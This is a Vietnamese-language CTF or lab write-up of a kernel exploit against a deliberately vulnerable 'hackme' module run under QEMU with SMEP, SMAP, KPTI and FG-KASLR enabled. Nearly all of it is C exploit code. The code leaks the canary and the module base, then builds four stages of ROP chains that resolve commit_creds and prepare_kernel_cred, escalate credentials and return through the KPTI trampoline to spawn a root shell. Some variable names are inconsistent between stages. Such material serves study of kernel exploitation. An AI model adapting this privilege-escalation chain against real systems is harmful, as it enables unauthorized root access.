# part1.1_bypass_smep

## setup

### run.sh

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep,+smap \
    -kernel vmlinuz \
    -initrd initramfs.cpio.gz \
    -hdb flag.txt \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -s \
    -append "console=ttyS0 kaslr kpti=1 quiet panic=1"

```

### Phân tích

- ở 2 hàm `hackme_read` `hackme_write` mình đã phân tích ở part 1

### Khai thác

#### Leak base

- Ta thấy tmp[38] không bị ảnh hưởng bởi `FG-KASLR`

```c
long int canary = 0;
unsigned long pop_rax_ret;       // pop rax; ret
unsigned long read_mem_pop1_ret; // mov eax, qword ptr [rax + 0x10]; pop rbp; ret;
unsigned long pop_rdi_rbp_ret;   // pop rdi; pop rbp; ret;
unsigned long ksymtab_prepare_kernel_cred;
unsigned long ksymtab_commit_creds;
void read_module()
{
    long int tmp[40];
    int check = read(fd_ko, tmp, sizeof(tmp));
    long int image_base = 0;
    image_base = tmp[38] - 0xa157ULL;
    canary = tmp[16];

    pop_rax_ret = image_base + 0x4d11UL;
    read_mem_pop1_ret = image_base + 0x4aaeUL;
    pop_rdi_rbp_ret = image_base + 0x38a0UL;
    ksymtab_prepare_kernel_cred = image_base + 0xf8d4fcUL;
    ksymtab_commit_creds = image_base + 0xf87d90UL;
    if (check < 0)
    {
        printf("read fail\n");
        exit(0);
    }
    for (int i = 0; i < 48; i++)
    {
        printf("hackme[%d]: %lp\n", i, tmp[i]);
    }
    printf("[*] Canary: 0x%lx\n", canary);
    printf("[*] Image base: 0x%lx\n", image_base);
}

```

#### STAGE 1: Leaking commit_creds()

- Do smep bật nên ta cần đổi page-table

```c
void stage_1(void);
void stage_2(void);
void stage_3(void);
void stage_4(void);
void get_commit_creds(void);

void stage_1(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rax_ret; // return address
    payload[off++] = ksymtab_commit_creds - 0x10; // rax <- __ksymtabs_commit_creds - 0x10
    payload[off++] = read_mem_pop1_ret; // rax <- [__ksymtabs_commit_creds]
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0; // dummy rax
    payload[off++] = 0x0; // dummy rdi
    payload[off++] = (unsigned long)get_commit_creds;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload to leak commit_creds()");
    ssize_t w = write(fd_ko, payload, sizeof(payload));

    puts("[!] Should never be reached");
}

void get_commit_creds(void){
    __asm__(
        ".intel_syntax noprefix;"
        "mov tmp_store, rax;"
        ".att_syntax;"
    );
    commit_creds = ksymtab_commit_creds + (int)tmp_store;
    printf("    --> commit_creds: %lx\n", commit_creds);
    // stage_2();
}
```

#### STAGE 2: Leaking prepare_kernel_cred()

```c
void get_prepare_kernel_cred(void);
void stage_2(void)
{
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0;                                // rbx
    payload[off++] = 0x0;                                // r12
    payload[off++] = 0x0;                                // rbp
    payload[off++] = pop_rax_ret;                        // return address
    payload[off++] = ksymtab_prepare_kernel_cred - 0x10; // rax <- __ksymtabs_prepare_kernel_cred - 0x10
    payload[off++] = read_mem_pop1_ret;                  // rax <- [__ksymtabs_prepare_kernel_cred]
    payload[off++] = 0x0;                                // dummy rbp
    payload[off++] = kpti_trampoline;                    // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0;                                // dummy rax
    payload[off++] = 0x0;                                // dummy rdi
    payload[off++] = (unsigned long)get_prepare_kernel_cred;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload to leak prepare_kernel_cred()");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}

void get_prepare_kernel_cred(void)
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov tmp_store, rax;"
        ".att_syntax;");
    prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)tmp_store;
    printf("    --> prepare_kernel_cred: %lx\n", prepare_kernel_cred);
    // stage_3();
}
```

#### STAGE 3

```c
void after_prepare_kernel_cred(void);

void stage_3(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rdi_rbp_ret; // return address
    payload[off++] = 0; // rdi <- 0
    payload[off++] = 0; // dummy rbp
    payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0; // dummy rax
    payload[off++] = 0x0; // dummy rdi
    payload[off++] = (unsigned long)after_prepare_kernel_cred;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload to call prepare_kernel_cred(0)");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}

void after_prepare_kernel_cred(void){
    __asm__(
        ".intel_syntax noprefix;"
        "mov tmp_store, rax;"
        ".att_syntax;"
    );
    returned_creds_struct = tmp_store;
    printf("    --> returned_creds_struct: %lx\n", returned_creds_struct);
    // stage_4();
}

```

#### STAGE 4:

```c
void get_shell(void);

void stage_4(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rdi_rbp_ret; // return address
    payload[off++] = returned_creds_struct; // rdi <- returned_creds_struct
    payload[off++] = 0; // dummy rbp
    payload[off++] = commit_creds; // commit_creds(returned_creds_struct)
    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0; // dummy rax
    payload[off++] = 0x0; // dummy rdi
    payload[off++] = (unsigned long)get_shell+1;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload to call commit_creds(returned_creds_struct)");
    ssize_t w = write(fd_ko, payload, sizeof(payload));

    puts("[!] Should never be reached");
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}
```
